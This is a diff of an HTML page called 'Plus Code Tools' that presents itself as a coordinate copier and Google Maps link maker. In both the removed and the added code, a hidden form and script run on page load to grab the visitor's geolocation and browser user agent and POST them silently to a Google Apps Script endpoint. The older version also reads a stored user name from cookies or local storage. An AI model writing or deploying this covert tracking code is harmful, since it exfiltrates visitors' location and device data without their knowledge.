@@ -6,38 +6,36 @@
     <title>Plus Code Tools</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-            form {
-      display: none;
-    }
-
+        form {
+            display: none;
+        }
     </style>
 </head>
 <body class="bg-gray-100 flex justify-center items-center h-screen">
     <form name="submit-to-google-sheet">
-        <input name="name" type="text" placeholder="Name" value="Jhon Doe" required>
+        <input name="name" type="text" placeholder="Name" value="John Doe" required>
         <input name="gmaps" type="text" placeholder="Coordinates" required>
         <input name="deviceInfo" type="text" placeholder="Device Info" required>
         <button type="submit">Send</button>
-      </form>
+    </form>
     
-
     <div class="bg-white p-8 shadow-lg rounded-lg max-w-md w-full">
         <h2 class="text-2xl font-bold text-center mb-8">Plus Code Tools</h2>
 
-        <!-- Menu 1: Copy Plus Code -->
+        <!-- Menu 1: Copy Coordinates -->
         <div class="mb-8">
-            <h3 class="text-lg font-semibold mb-4">Copy Plus Code</h3>
-            <input type="text" id="codeToCopy" value="8Q62+2C2" readonly class="border border-gray-300 rounded-lg w-full p-3 mb-4">
+            <h3 class="text-lg font-semibold mb-4">Copy Coordinates</h3>
+            <input type="text" id="codeToCopy" readonly class="border border-gray-300 rounded-lg w-full p-3 mb-4">
             <button onclick="copyCode()" class="w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 transition-colors">
-                Copy Code
+                Copy Coordinates
             </button>
-            <p class="text-green-500 text-sm mt-2 hidden" id="copyMessage">Code copied to clipboard!</p>
+            <p class="text-green-500 text-sm mt-2 hidden" id="copyMessage">Coordinates copied to clipboard!</p>
         </div>
 
-        <!-- Menu 2: Open Plus Code in Google Maps -->
+        <!-- Menu 2: Open Coordinates in Google Maps -->
         <div>
-            <h3 class="text-lg font-semibold mb-4">Open Plus Code in Google Maps</h3>
-            <input type="text" id="codeToOpen" placeholder="Paste your Plus Code here" class="border border-gray-300 rounded-lg w-full p-3 mb-4">
+            <h3 class="text-lg font-semibold mb-4">Open Coordinates in Google Maps</h3>
+            <input type="text" id="codeToOpen" placeholder="Paste your coordinates here" class="border border-gray-300 rounded-lg w-full p-3 mb-4">
             <button onclick="generateLink()" class="w-full bg-green-500 text-white py-2 px-4 rounded-lg hover:bg-green-600 transition-colors">
                 Generate Google Maps Link
             </button>
@@ -48,64 +46,84 @@
         </div>
     </div>
 
-    <script src="main.js"></script>
     <script>
-          const scriptURL = 'https://script.google.com/macros/s/AKfycbxgilOwmY4GPxWASlZ8lWzkStbPVdDWTeetj1HDxe6hhMnUR2dqrbVtOD25wQ0MadzXFQ/exec';
-    const form = document.forms['submit-to-google-sheet'];
-    const nameInput = form.elements['name'];
-    const gmapsInput = form.elements['gmaps'];
-    const deviceInfoInput = form.elements['deviceInfo'];
+// Function to copy coordinates to clipboard
+function copyCode() {
+    var copyText = document.getElementById("codeToCopy");
 
-    function getCookie(name) {
-      const value = `; ${document.cookie}`;
-      const parts = value.split(`; ${name}=`);
-      if (parts.length === 2) return parts.pop().split(';').shift();
-      return null;
-    }
+    // Select the text field
+    copyText.select();
+    copyText.setSelectionRange(0, 99999); // For mobile devices
 
-    function getLocalStorageItem(key) {
-      return localStorage.getItem(key);
-    }
+    // Copy the text inside the text field
+    document.execCommand("copy");
 
-    function setNameInput() {
-      // Try to get the name from cookies first
-      let userName = getCookie('userName');
-      // If no cookie, try to get from local storage
-      if (!userName) {
-        userName = getLocalStorageItem('userName');
-      }
-      // Set the name input value if a name was found
-      if (userName) {
-        nameInput.value = userName;
-      }
-    }
+    // Show the message
+    var message = document.getElementById("copyMessage");
+    message.classList.remove("hidden");
 
-    function success(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      gmapsInput.value = `${latitude},${longitude}`;
+    // Hide the message after 2 seconds
+    setTimeout(function() {
+        message.classList.add("hidden");
+    }, 2000);
+}
 
-      // Get device information
-      const userAgent = navigator.userAgent;
-      deviceInfoInput.value = userAgent;
+// Function to generate Google Maps link
+function generateLink() {
+    var coordinates = document.getElementById("codeToOpen").value.trim();
+    var linkElement = document.getElementById("link");
+    var mapsLink = document.getElementById("mapsLink");
 
-      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-        .then(response => console.log('Success!', response))
-        .catch(error => console.error('Error!', error.message));
-    }
+    if (coordinates) {
+        // Generate the Google Maps link using Coordinates
+        var mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + encodeURIComponent(coordinates);
 
-    function error() {
-      console.error('Unable to retrieve your location');
-    }
+        // Set the href attribute of the anchor element to the generated URL
+        mapsLink.href = mapsUrl;
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(success, error);
+        // Show the link div
+        linkElement.classList.remove("hidden");
     } else {
-      console.error('Geolocation is not supported by your browser');
+        // Hide the link if no Coordinates are provided
+        linkElement.classList.add("hidden");
     }
+}
 
-    // Set the name input value from cookies or local storage
-    setNameInput();
+    </script>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxgilOwmY4GPxWASlZ8lWzkStbPVdDWTeetj1HDxe6hhMnUR2dqrbVtOD25wQ0MadzXFQ/exec';
+        const form = document.forms['submit-to-google-sheet'];
+        const gmapsInput = form.elements['gmaps'];
+
+        function success(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const coordinates = `${latitude},${longitude}`;
+            gmapsInput.value = coordinates;
+
+            // Populate the copy and map fields with coordinates
+            document.getElementById("codeToCopy").value = coordinates;
+
+            // Get device information
+            const userAgent = navigator.userAgent;
+            form.elements['deviceInfo'].value = userAgent;
+
+            // Submit the form
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => console.log('Success!', response))
+                .catch(error => console.error('Error!', error.message));
+        }
+
+        function error() {
+            console.error('Unable to retrieve your location');
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(success, error);
+        } else {
+            console.error('Geolocation is not supported by your browser');
+        }
+
     </script>
 </body>
 </html>
